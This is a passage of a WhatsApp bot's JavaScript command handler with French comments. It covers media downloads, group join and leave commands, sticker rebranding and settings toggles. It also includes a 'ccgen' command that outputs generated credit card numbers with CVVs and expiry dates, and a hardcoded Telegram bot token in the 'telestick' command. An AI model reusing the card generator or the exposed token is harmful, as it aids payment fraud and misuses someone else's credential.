        // 1. Vérification de l'entrée utilisateur
        if (!text) return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}ytmp4 [url youtube]`);
        
        // Petite regex pour vérifier si c'est bien un lien YouTube
        const isUrl = text.match(/(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
        if (!isUrl) return gaara.reply(`❌ *${toSmallCaps("invalid youtube link")}*`);

        await gaara.react("⏳");

        // 2. Appel à l'API de David Cyril
        const apiUrl = `https://apis.davidcyril.name.ng/youtube/mp4?url=${encodeURIComponent(text)}&apikey=votre_cle_ici`;
        const response = await axios.get(apiUrl);
        const res = response.data;

        if (!res.status || !res.result) {
            return gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("could not fetch video")}`);
        }

        const video = res.result;

        // 3. Information sur le téléchargement
        const infoMsg = `*${toSmallCaps("youtube mp4")}*
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n│🪭 *ʙᴏᴛ ɴᴀᴍᴇ GIDEON ᴍᴅ*\n│👦🏻 *ʙʏ Cobra ᴛᴇᴄʜ*
│📝 *${toSmallCaps("title")} :* ${video.title}
│🔗 *${toSmallCaps("url")} :* ${text}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
> ${toSmallCaps("uploading video, please wait")}... 🚀`;

        await sock.sendMessage(gaara.chat, { 
            image: { url: video.thumbnail }, 
            caption: infoMsg 
        }, { quoted: mquote });

        await gaara.react("📥");

        // 4. Envoi du fichier Vidéo (MP4)
        // Note : On utilise 'video' au lieu de 'document' pour qu'elle soit jouable directement
        await sock.sendMessage(gaara.chat, { 
            video: { url: video.url }, 
            caption: `✅ *${video.title}*`,
            mimetype: 'video/mp4',
            fileName: `${video.title}.mp4`
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error('YTMP4 Error:', e);
        gaara.reply(`❌ *${toSmallCaps("an error occurred")}* : ${toSmallCaps("api limit or server busy")}`);
    }
}
break;

case 'apk':
case 'download': {
    try {
        const axios = require('axios');
        
        if (!text) return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}apk whatsapp`);

        await gaara.react("🔍");

        // 1. Appel à l'API de David Cyril
        const apiUrl = `https://apis.davidcyril.name.ng/download/apk?text=${encodeURIComponent(text)}&apikey=votre_cle_ici`;
        const response = await axios.get(apiUrl);
        const res = response.data;

        if (!res.status || !res.apk) {
            return gaara.reply(`❌ *${toSmallCaps("application not found")}*`);
        }

        const app = res.apk;

        // 2. Préparation du message d'info
        const infoMsg = `*${toSmallCaps("apk downloader")}*
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n│🪭 *ʙᴏᴛ ɴᴀᴍᴇ GIDEON ᴍᴅ*\n│👦🏻 *ʙʏ Cobra ᴛᴇᴄʜ*
│📝 *${toSmallCaps("name")} :* ${app.name}
│🆔 *${toSmallCaps("package")} :* ${app.package}
│🆙 *${toSmallCaps("last update")} :* ${app.lastUpdated}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
> ${toSmallCaps("sending the file, please wait")}... ⏳`;

        // 3. Envoi de l'image de l'icône avec les détails
        await sock.sendMessage(gaara.chat, { 
            image: { url: app.icon }, 
            caption: infoMsg 
        }, { quoted: mquote });

        await gaara.react("📥");

        // 4. Envoi du fichier APK
        await sock.sendMessage(gaara.chat, { 
            document: { url: app.downloadLink }, 
            fileName: `${app.name}.apk`, 
            mimetype: 'application/vnd.android.package-archive' 
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error('APK Error:', e);
        gaara.reply(`❌ *${toSmallCaps("an error occurred")}* : ${toSmallCaps("please check the app name or your api key")}`);
    }
}
break;

case 'join': {
    try {
        if (!isOwner) return gaara.reply(toSmallCaps("only bot owner can use this command"));
        if (!text) return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}join https://chat.whatsapp.com/xxxxx`);

        // Extraction du code de l'invitation depuis le lien
        const linkRegex = /chat\.whatsapp\.com\/([\w\d!@#$%^&*+-=]+)/;
        const [_, code] = text.match(linkRegex) || [];

        if (!code) return gaara.reply(toSmallCaps("invalid group link"));

        await gaara.react("📨");
        
        // Commande pour rejoindre
        const response = await sock.groupAcceptInvite(code);
        
        gaara.reply(toSmallCaps("successfully joined the group"));
        await gaara.react("✅");

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to join. check if the link is active or if the bot is banned from this group."));
    }
}
break;
case 'left': {
    try {
        if (!isOwner) return gaara.reply(toSmallCaps("only bot owner can use this command"));

        let targetChat = gaara.chat;

        if (text && text.includes('chat.whatsapp.com')) {
            const linkRegex = /chat\.whatsapp\.com\/([\w\d!@#$%^&*+-=]+)/;
            const [_, code] = text.match(linkRegex) || [];
            if (code) {
                const groupInfo = await sock.groupGetInviteInfo(code);
                targetChat = groupInfo.id;
            }
        }

        if (!targetChat.endsWith('@g.us')) return gaara.reply(toSmallCaps("this command must be used in a group or with a valid link"));

        // 1. Récupérer les participants pour le hidetag
        const groupMetadata = await sock.groupMetadata(targetChat);
        const participants = groupMetadata.participants.map(a => a.id);

        // 2. Envoyer le message "I'm leaving the group" avec hidetag
        await sock.sendMessage(targetChat, { 
            text: "I'm leaving the group", 
            mentions: participants 
        });

        // 3. Envoyer le sticker à partir d'un lien (conversion auto par Baileys)
        await sock.sendMessage(targetChat, { 
            sticker: { url: "https://files.catbox.moe/rr7592.jpg" }, // METTEZ VOTRE LIEN ICI
            mimetype: "image/webp"
        });

        // 4. Attendre 2 secondes (2000 millisecondes)
        await new Promise(resolve => setTimeout(resolve, 2000));

        // 5. Quitter le groupe
        await sock.groupLeave(targetChat);

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("an error occurred."));
    }
}
break;

case 'cloneweb':
case 'webdl': {
    try {
        const axios = require("axios");
        const AdmZip = require("adm-zip"); // Make sure to npm install adm-zip
        await gaara.react("🌐");

        if (!text) return gaara.reply(`*${toSmallCaps("usage")} :* .cloneweb https://google.com`);

        let url = text.startsWith('http') ? text : `https://${text}`;
        gaara.reply(toSmallCaps("cloning and injecting Gideon md signature..."));

        const apiUrl = `https://apis.davidcyril.name.ng/tools/downloadweb?url=${encodeURIComponent(url)}&apikey=`;
        const response = await axios.get(apiUrl);

        if (!response.data || (response.data.success !== "true" && response.data.success !== true)) {
            return gaara.reply(toSmallCaps("cloning failed. check the url."));
        }

        const downloadUrl = response.data.response.downloadUrl;
        const siteName = new URL(url).hostname;

        // 1. Download the ZIP into a buffer
        const zipBuffer = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
        const zip = new AdmZip(zipBuffer.data);
        const zipEntries = zip.getEntries();

        // 2. Inject "Spider XD" comment in HTML/JS/CSS files
        zipEntries.forEach((entry) => {
            if (entry.entryName.endsWith(".html")) {
                let content = entry.getData().toString("utf8");
                content = `\n` + content;
                zip.updateFile(entry, Buffer.from(content, "utf8"));
            } else if (entry.entryName.endsWith(".js") || entry.entryName.endsWith(".css")) {
                let content = entry.getData().toString("utf8");
                content = `/* Cloned by Gideon md */\n` + content;
                zip.updateFile(entry, Buffer.from(content, "utf8"));
            }
        });

        const finalZipBuffer = zip.toBuffer();

        // 3. Send the modified ZIP
        let caption = `
*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎\n*│🪭 ʙᴏᴛ ɴᴀᴍᴇ Gideon ᴍᴅ*\n*│👦🏻 ʙʏ Cobra ᴛᴇᴄʜ*
*│ 🌐 ${toSmallCaps("GIDEON md web cloner")}*
*│ ◈ ${toSmallCaps("status")} :* Signature Injected ✅
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`.trim();

        await sock.sendMessage(gaara.chat, {
            document: finalZipBuffer,
            fileName: `${siteName}_Gideon_md.zip`,
            mimetype: 'application/zip',
            caption: caption
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("CloneWeb Error:", e.message);
        gaara.reply(toSmallCaps("error while modifying the source code."));
    }
}
break;


case 'ccgen':
case 'cc': {
    try {
        const axios = require("axios");
        await gaara.react("💳");

        // Analyse de l'entrée : on sépare le type et la quantité
        let input = text.split('|');
        let typeInput = input[0] ? input[0].trim() : "MasterCard";
        let amount = input[1] ? input[1].trim() : "10";

        // Correction automatique de la casse pour l'API
        let type = typeInput.toLowerCase() === 'visa' ? 'Visa' : 'MasterCard';

        gaara.reply(toSmallCaps("génération spider en cours..."));

        const apiUrl = `https://apis.davidcyril.name.ng/tools/ccgen?type=${type}&amount=${amount}`;
        const response = await axios.get(apiUrl);

        // LE FIX : On vérifie "status" au lieu de "success"
        if (!response.data || response.data.status !== true) {
            return gaara.reply(toSmallCaps("erreur : l'api n'a pas pu générer de cartes."));
        }

        const cards = response.data.cards;

        let report = `
*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*
*│ 💳 ${toSmallCaps("Gideon md cc gen")}*
*│ ${toSmallCaps("configurations")}*
*│ ◈ ${toSmallCaps("type")} :* ${response.data.card_type}
*│ ◈ ${toSmallCaps("total")} :* ${response.data.total}
*│ ◈ ${toSmallCaps("cartes générées")}*
`;

        // Boucle sur le tableau "cards"
        cards.forEach((cc) => {
            report += `*│*
*│ 👤 ${toSmallCaps("nom")} :* ${cc.name}
*│ 💳 ${toSmallCaps("numéro")} :* \`${cc.number}\`
*│ 🔒 ${toSmallCaps("cvv")} :* ${cc.cvv}
*│ 📅 ${toSmallCaps("expire")} :* ${cc.expiry}
*│*
`;
        });

        report += `*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*

> *${toSmallCaps("powered by Cobra tech")}*`.trim();

        // Envoi final avec mquote
        await sock.sendMessage(gaara.chat, { 
            text: report 
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("CCGen Error:", e.message);
        gaara.reply(toSmallCaps("le serveur cc est injoignable ou crashé."));
    }
}
break;


case 'chainfo':
case 'channel': {
    try {
        const axios = require("axios");
        await gaara.react("📢");

        let link = text || (m.quoted ? m.quoted.text : "");
        if (!link || !link.includes("whatsapp.com/channel")) {
            return gaara.reply(`*${toSmallCaps("exemple")} :* .chainfo https://whatsapp.com/channel/xxxx`);
        }

        gaara.reply(toSmallCaps("wait for extracting channel info..."));

        const apiUrl = `https://apis.davidcyril.name.ng/stalk/wa?url=${encodeURIComponent(link)}`;
        const response = await axios.get(apiUrl);

        // On vérifie si on a au moins le titre, car l'API ne donne pas de "success: true" ici
        if (!response.data || !response.data.title) {
            return gaara.reply(toSmallCaps("impossible de trouver les infos de ce canal."));
        }

        const channel = response.data;

        let caption = `
*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎
*│ 𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐂𝐇𝐀𝐈𝐍𝐅𝐎
*│ 📢 ${toSmallCaps("GIDEON md channel stalk")}*
*│ ${toSmallCaps("informations")}*
*│ ◈ ${toSmallCaps("nom")} :* ${channel.title}
*│ ◈ ${toSmallCaps("followers")} :* ${channel.followers || "N/A"}
*│ ◈ ${toSmallCaps("nombre")} :* ${channel.followersCount || "N/A"}
*│ ${toSmallCaps("description")}*
*│* ${channel.description || "Aucune description"}
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎

> *${toSmallCaps("powered by Cobra tech")}*`.trim();

        // Note: Si l'API ne renvoie pas d'image, on envoie juste le texte
        if (channel.img || channel.image) {
            await sock.sendMessage(gaara.chat, {
                image: { url: channel.img || channel.image },
                caption: caption
            }, { quoted: mquote });
        } else {
            await gaara.reply(caption);
        }

        await gaara.react("✅");

    } catch (e) {
        console.error("Channel Info Error:", e.message);
        gaara.reply(toSmallCaps("le serveur stalk est injoignable."));
    }
}
break;

case 'removebg':
case 'rbg': {
    try {
        const axios = require("axios");
        const FormData = require('form-data');
        
        // Vérifier si c'est une image (directe ou citée)
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';

        if (!/image/.test(mime)) {
            return gaara.reply(`*${toSmallCaps("info")} :* ${toSmallCaps("réponds à une image avec la commande .removebg")}`);
        }

        await gaara.react("🪄");
        gaara.reply(toSmallCaps("traitement en cours..."));

        // 1. Téléchargement de l'image
        const media = await quoted.download();

        // 2. Upload vers Catbox pour avoir une URL
        const bodyForm = new FormData();
        bodyForm.append('fileToUpload', media, 'image.png');
        bodyForm.append('reqtype', 'fileupload');

        const uploadRes = await axios.post('https://catbox.moe/user/api.php', bodyForm, {
            headers: bodyForm.getHeaders()
        });
        
        const imageUrl = uploadRes.data;

        // 3. Appel de l'API RemoveBG de David Cyril
        const apiUrl = `https://apis.davidcyril.name.ng/removebg?url=${encodeURIComponent(imageUrl)}`;
        
        // Note : L'API renvoie généralement directement le flux de l'image traitée
        await sock.sendMessage(gaara.chat, {
            image: { url: apiUrl },
            caption: `✨ *${toSmallCaps("Gideon md removebg")}*\n\n> *${toSmallCaps("arrière-plan retiré")}*`
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("RemoveBG Error:", e.message);
        gaara.reply(toSmallCaps("erreur lors du traitement de l'image."));
    }
}
break;

case 'ss':
case 'ssweb': {
    try {
        const axios = require("axios");
        await gaara.react("📸");

        // Vérification si une URL est fournie
        if (!text) return gaara.reply(`*${toSmallCaps("exemple")} :* .ssweb https://google.com`);

        // Nettoyage de l'URL (ajout de https:// si absent)
        let url = text.startsWith('http') ? text : `https://${text}`;

        gaara.reply(toSmallCaps("capture d'écran en cours..."));

        // Appel de l'API SSWeb de David Cyril
        const apiUrl = `https://apis.davidcyril.name.ng/ssweb?url=${encodeURIComponent(url)}`;
        
        // On envoie directement le résultat de l'API comme image
        await sock.sendMessage(gaara.chat, {
            image: { url: apiUrl },
            caption: `🌐 *${toSmallCaps("Gideon md screenshot")}*\n\n*🔗 ${toSmallCaps("url")} :* ${url}\n\n> *${toSmallCaps("powered by Cobra tech")}*`
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("SSWeb Error:", e.message);
        gaara.reply(toSmallCaps("erreur lors de la capture du site."));
    }
}
break;

case 'quote':
case 'citation': {
    try {
        const axios = require("axios");
        await gaara.react("📜");

        const apiUrl = `https://apis.davidcyril.name.ng/random/quotes`;
        const response = await axios.get(apiUrl);

        // Vérification du statut dans ton nouveau JSON
        if (!response.data || !response.data.status) {
            return gaara.reply(toSmallCaps("impossible de récupérer une citation."));
        }

        const quoteData = response.data.quote;
        const quoteText = quoteData.text;
        const quoteAuthor = quoteData.author;

        // Mise en forme propre
        let message = `
✨ *${toSmallCaps("Gideon md quotes")}*

“ ${quoteText} ”

*─ ${quoteAuthor}*

> *${toSmallCaps("powered by Cobra tech")}*`.trim();

        await gaara.reply(message);
        await gaara.react("✅");

    } catch (e) {
        console.error("Quote Error:", e.message);
        gaara.reply(toSmallCaps("erreur de connexion avec l'api de citations."));
    }
}
break;

case 'tiktok':
case 'tt': {
    try {
        const axios = require("axios");
        await gaara.react("📥");

        if (!text) return gaara.reply(`*${toSmallCaps("exemple")} :* .tiktok [lien]`);
        
        const apiUrl = `https://apis.davidcyril.name.ng/download/tiktok?url=${encodeURIComponent(text)}&apikey=`;
        const response = await axios.get(apiUrl);

        if (!response.data || !response.data.success) {
            return gaara.reply(toSmallCaps("impossible de récupérer la vidéo."));
        }

        const res = response.data.result;

        // Texte du message
        let caption = `
🚀 *${toSmallCaps("Gideon md tiktok")}*

*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n*│🪭 ʙᴏᴛ ɴᴀᴍᴇ Gideon ᴍᴅ*\n*│👦🏻 ʙʏ Cobra ᴛᴇᴄʜ*\n*│ ${toSmallCaps("info")}*
*│ ◈ ${toSmallCaps("name")} : ${res.author.nickname || "User"}*
*│ ◈ ${toSmallCaps("desc")} : ${res.desc || "No description"}*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*`.trim();

        // Définition du bouton pour l'audio
        const buttons = [
            { 
                buttonId: `.tmaudio ${text}`, 
                buttonText: { displayText: toSmallCaps("get audio") }, 
                type: 1 
            }
        ];

        // Envoi de la vidéo avec le bouton
        await sock.sendMessage(gaara.chat, {
            video: { url: res.video },
            caption: caption,
            footer: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ`,
            buttons: buttons,
            headerType: 4
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("TikTok Error:", e);
        gaara.reply(toSmallCaps("erreur avec le service tiktok."));
    }
}
break;

// Commande cachée pour faire fonctionner le bouton audio
case 'tmaudio': {
    if (!text) return;
    const axios = require("axios");
    const apiUrl = `https://apis.davidcyril.name.ng/download/tiktok?url=${encodeURIComponent(text)}&apikey=`;
    const response = await axios.get(apiUrl);
    const audioUrl = response.data.result.music;

    await sock.sendMessage(gaara.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mp4',
        ptt: false 
    }, { quoted: mquote });
}
break;


case 'couplepp':
case 'ppcp': {
    try {
        const axios = require("axios");
        await gaara.react("👩‍❤️‍👨");

        // Utilisation du nouveau domaine stable avec la structure demandée
        const apiUrl = `https://apis.davidcyril.name.ng/couplepp?apikey=`;
        const response = await axios.get(apiUrl);

        if (!response.data || !response.data.success) {
            return gaara.reply(toSmallCaps("api error: impossible de récupérer les images."));
        }

        const res = response.data;

        // Envoi de la version Homme
        await sock.sendMessage(gaara.chat, { 
            image: { url: res.male }, 
            caption: `♂️ *${toSmallCaps("Gideon md male")}*` 
        }, { quoted: mquote });

        // Envoi de la version Femme
        await sock.sendMessage(gaara.chat, { 
            image: { url: res.female }, 
            caption: `♀️ *${toSmallCaps("Gideon md female")}*` 
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("CouplePP Error:", e.message);
        gaara.reply(toSmallCaps("le serveur david cyril ne répond pas."));
    }
}
break;


case 'delete':
case 'del': {
    try {
        // 1. Vérifier si on répond à un message
        if (!m.quoted) return gaara.reply(`*${toSmallCaps("error")} :* ${toSmallCaps("please reply to the message you want to delete")}`);

        // 2. Sécurité : En groupe, seul l'admin ou l'owner peut supprimer le message d'un autre
        if (isGroup && !isAdmins && !isOwner) {
            return gaara.reply(`*${toSmallCaps("error")} :* ${toSmallCaps("only admins can delete messages from other members")}`);
        }

        // 3. Préparer la clé du message à supprimer
        const key = {
            remoteJid: m.chat,
            fromMe: m.quoted.fromMe,
            id: m.quoted.id,
            participant: m.quoted.sender
        };

        // 4. Envoyer l'ordre de suppression (Delete for Everyone)
        await sock.sendMessage(m.chat, { delete: key });

        // Petit feedback discret avec une réaction (optionnel)
        await gaara.react("🗑️");

    } catch (e) {
        console.error("Delete Error:", e);
        gaara.reply(toSmallCaps("failed to delete the message."));
    }
}
break;


case 'autotyping': {
    try {
        await gaara.react("⌨️");
	const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        if (!isOwner) return gaara.reply(toSmallCaps("owner only"), m.chat, { quoted: mquote });

        if (args[0]) {
            let mode = args[0].toLowerCase();
            if (['on', 'off'].includes(mode)) {
                sessionsConfig[botId].autotyping = mode;
                
                await gaara.react("✅");
                return gaara.reply(`✅ *${toSmallCaps("autotyping updated")}*\n\n> *${toSmallCaps("status")} :* ${mode.toUpperCase()}\n\n*Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ*`, m.chat, { quoted: mquote }); 
            } else {
                return gaara.reply(`${toSmallCaps("usage")} : ${prefix}autotyping on / off`, m.chat, { quoted: mquote }); 
            }
        }

        const currentMode = sessionsConfig[botId].autotyping === 'on' ? '🟢 ᴏɴ' : '🔴 ᴏғғ';
        const msg = `⌨️ *${toSmallCaps("autotyping settings")}*\n\n` +
                    `*${toSmallCaps("current status")} :* ${currentMode}\n\n` +
                    `> ${toSmallCaps("use")} *${prefix}autotyping on* / *off*`;

    await gaara.reply(msg, m.chat, { quoted: mquote });

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("error updating autotyping"));
    }
}
break;

case 'autorecording': {
    try {
        await gaara.react("🎙️");
	const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        if (!isOwner) return gaara.reply(toSmallCaps("owner only"));

        if (args[0]) {
            let mode = args[0].toLowerCase();
            if (['on', 'off'].includes(mode)) {
                sessionsConfig[botId].autorecording = mode;
                
                await gaara.react("✅");
                return gaara.reply(`✅ *${toSmallCaps("autorecording updated")}*\n\n> *${toSmallCaps("status")} :* ${mode.toUpperCase()}\n\n*Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ*`);
            } else {
                return gaara.reply(`${toSmallCaps("usage")} : ${prefix}autorecording on / off`);
            }
        }

        const currentMode = sessionsConfig[botId].autorecording === 'on' ? '🟢 ᴏɴ' : '🔴 ᴏғғ';
        const msg = `🎙️ *${toSmallCaps("autorecording settings")}*\n\n` +
                    `*${toSmallCaps("current status")} :* ${currentMode}\n\n` +
                    `> ${toSmallCaps("use")} *${prefix}autorecording on* / *off*`;

        await gaara.reply(msg);

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("error updating autorecording"));
    }
}
break;


//-- ANTICALL CASE
case 'anticall': {
    try {
        await gaara.react("📞");
	const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        // Vérification si c'est l'Owner
        if (!isOwner) return gaara.reply(toSmallCaps("owner only"));

        if (args[0]) {
            let mode = args[0].toLowerCase();
            // Validation des options autorisées
            if (['on', 'off'].includes(mode)) {
                sessionsConfig[botId].anticall = mode;
                
                await gaara.react("✅");
                return gaara.reply(`✅ *${toSmallCaps("anticall updated")}*\n\n> *${toSmallCaps("status")} :* ${mode.toUpperCase()}\n\n*Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ*`);
            } else {
                // Si l'argument est incorrect
                return gaara.reply(`${toSmallCaps("usage")} : ${prefix}anticall on / off`);
            }
        }

        // Si aucun argument n'est fourni, on affiche l'état actuel
        const currentMode = sessionsConfig[botId].anticall === 'on' ? '🟢 ᴏɴ' : '🔴 ᴏғғ';
        const msg = `🚫 *${toSmallCaps("anticall settings")}*\n\n` +
                    `*${toSmallCaps("current status")} :* ${currentMode}\n\n` +
                    `> ${toSmallCaps("use")} *${prefix}anticall on* / *off*`;

        await gaara.reply(msg);

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("error updating anticall"));
    }
}
break;

// --- DEBUT DU CASE ---
case 'take': case 'steal': case 'swm': {
    try {
        // 1. Vérifie si l'utilisateur a cité un message
        if (!m.quoted) return gaara.reply(`*${toSmallCaps("veuillez citer un sticker")}*`);

        // 2. Vérifie si c'est bien un sticker (webp)
        const mime = (m.quoted.msg || m.quoted).mimetype || '';
        if (!/webp/.test(mime)) return gaara.reply(`*${toSmallCaps("ceci n'est pas un sticker")}*`);

        await gaara.react("⏳");

        // 3. Découpage des arguments (ex: .take MonPack | MonNom)
        // args.join(" ") récupère tout le texte après la commande
        const textInput = args.join(" ");
        const [packname, ...authorParts] = (textInput || '').split('|');
        
        // Valeurs par défaut si l'utilisateur ne précise rien
        const finalPackname = packname.trim() || "𝚂𝚃𝙰𝚁 GIDEON";
        const finalAuthor = authorParts.join('|').trim() || "COBRA-𝚃𝙴𝙲𝙷";

        // 4. Téléchargement du sticker via smsg.js
        let media = await m.quoted.download();
        if (!media) return gaara.reply(toSmallCaps("erreur de telechargement"));

        // 5. Utilisation de addExif pour injecter les nouvelles infos
        const stickerWithExif = await addExif(media, finalPackname, finalAuthor);

        // 6. Envoi du sticker modifié
        await sock.sendMessage(m.chat, { 
            sticker: stickerWithExif 
        }, { quoted: m });

        await gaara.react("✅");

    } catch (e) {
        console.error('Take Command Error:', e);
        await gaara.react("❌");
        gaara.reply(`❌ *${toSmallCaps("erreur")}*\n\n> ${toSmallCaps("verifiez que le dossier lib et le fichier exif.js sont bien presents.")}`);
    }
}
break;

// --- FIN DU CASE ---

case 'telestick': case 'tgsticker': {
    try {
        const axios = require('axios');
        await gaara.react("📥");

        // 1. Vérification de l'argument (Lien Telegram)
        if (!args[0] || !args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            return gaara.reply(`❌ *${toSmallCaps("erreur")}*\n\n> ${toSmallCaps("veuillez fournir un lien telegram valide.")}`);
        }

        let packName = args[0].split("/addstickers/")[1];
        let botToken = "8554317133:AAGJtm5eqEj8GR8GN2D0MILhVSJKwjwsYcE";

        // 2. Récupération des infos du pack via l'API Telegram
        let response = await axios.get(`https://api.telegram.org/bot${botToken}/getStickerSet?name=${packName}`);
        if (!response.data.ok) return gaara.reply(toSmallCaps("pack introuvable"));

        let stickers = response.data.result.stickers;
        let limit = stickers.length > 15 ? 15 : stickers.length; // Limite pour la stabilité sur Termux

        await gaara.reply(`📦 *${toSmallCaps("téléchargement")}* : ${limit} stickers\n✨ *${toSmallCaps("watermark")}* : GIDEON 𝙼𝙳`);

        for (let i = 0; i < limit; i++) {
            // 3. Récupération du lien direct du sticker
            let fileId = stickers[i].file_id;
            let fileInfo = await axios.get(`https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`);
            let finalUrl = `https://api.telegram.org/file/bot${botToken}/${fileInfo.data.result.file_path}`;

            // 4. Téléchargement du buffer du sticker
            const stickerRes = await axios.get(finalUrl, { responseType: 'arraybuffer' });
            const buffer = Buffer.from(stickerRes.data, 'binary');

            // 5. Injection de l'EXIF (Comme dans ta commande TAKE)
            // On utilise la fonction addExif de ton fichier lib/exif.js
            const stickerWithMeta = await addExif(buffer, "𝚂𝚃𝙰𝚁 GIDEON", "GIDEON-𝚃𝙴𝙲𝙷");

            // 6. Envoi du sticker avec ton nom de pack
            await sock.sendMessage(m.chat, { 
                sticker: stickerWithMeta 
            });

            // Petit délai pour éviter de saturer la connexion
            await new Promise(resolve => setTimeout(resolve, 800));
        }

        await gaara.react("✅");

    } catch (e) {
        console.error('Telestick Error:', e);
        await gaara.react("❌");
        gaara.reply(toSmallCaps("erreur lors de la récupération du pack telegram"));
    }
}
break;

case 'wasted': {
    try {
        const Jimp = require('jimp');
        const axios = require('axios');
        
        let target = m.quoted ? m.quoted.sender : (m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : null);
        if (!target) return gaara.reply(`*${toSmallCaps("please reply to someone or mention a user")}*`);

        await gaara.react("📷");

        // 1. Récupérer l'URL de la photo de profil
        let ppUrl;
        try {
            ppUrl = await sock.profilePictureUrl(target, 'image');
        } catch {
            ppUrl = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png'; 
        }

        // 2. Téléchargement sécurisé des images avec Axios
        const getBuffer = async (url) => {
            const res = await axios.get(url, { responseType: 'arraybuffer', headers: { 'User-Agent': 'Mozilla/5.0' } });
            return Buffer.from(res.data, 'binary');
        };

        const [ppBuffer, wastedBuffer] = await Promise.all([
            getBuffer(ppUrl),
            getBuffer('https://s.neoxr.eu/get/MnvzRq.png')
        ]);

        // 3. Traitement avec Jimp
        const profileImage = await Jimp.read(ppBuffer);
        const wastedOverlay = await Jimp.read(wastedBuffer);

        // 4. Appliquer un filtre Gris (optionnel pour le style mort)
        profileImage.greyscale(); 

        // 5. Redimensionnement
        profileImage.resize(500, 500);
        wastedOverlay.resize(500, Jimp.AUTO);

        // 6. Calcul de la position centrale
        const posY = (profileImage.getHeight() / 2) - (wastedOverlay.getHeight() / 2);

        // 7. Superposition
        profileImage.composite(wastedOverlay, 0, posY);

        const resultBuffer = await profileImage.getBufferAsync(Jimp.MIME_JPEG);

        // 8. Envoi
        await sock.sendMessage(gaara.chat, { 
            image: resultBuffer, 
            caption: `💀 *${toSmallCaps("wasted")}* ! @${target.split('@')[0]}`,
            mentions: [target]
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error('Wasted Error:', e);
        gaara.reply(`❌ *${toSmallCaps("connection error")}* : ${toSmallCaps("please try again")}`);
    }
}
break;

case 'autoreact': {
    try {
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        // Sécurité Propriétaire
        if (!isOwner) return gaara.reply(`*${toSmallCaps("access denied")}*`);

        // Si l'utilisateur a cliqué sur un bouton (ex: .autoreact all)
        if (args[0]) {
            let mode = args[0].toLowerCase();
            if (['all', 'group', 'chat', 'off'].includes(mode)) {
                sessionsConfig[botId].autoreact = mode;
                await gaara.react("✅");
                return gaara.reply(`✨ *${toSmallCaps("autoreact status")}* : ${mode === 'off' ? '🔴 OFF' : `🟢 ON (${mode.toUpperCase()})`}`);
            }
        }

        await gaara.react("⚙️");

        // --- RÉCUPÉRATION DU STATUT ACTUEL ---
        const currentStatus = sessionsConfig[botId].autoreact || 'off';

        // --- CONSTRUCTION DU MESSAGE ---
        const autoReactHeader = `*╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*\n*│🪭 ʙᴏᴛ ɴᴀᴍᴇ Gideon ᴍᴅ*\n*│👦🏻 ʙʏ Cobra ᴛᴇᴄʜ*
*│  ✨  ${toSmallCaps("autoreact setup")}  ✨*
*│ 📊 ${toSmallCaps("current")} : ${toSmallCaps(currentStatus)}*
*╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤*︎`;

        const autoReactBody = `\n${toSmallCaps("select the reaction mode for the bot below")}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ*`;

        // --- ENVOI DU MESSAGE INTERACTIF (NATIVE FLOW) ---
        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: `*${toSmallCaps("Gideon md settings")}*`,
                            hasMediaAttachment: false
                        },
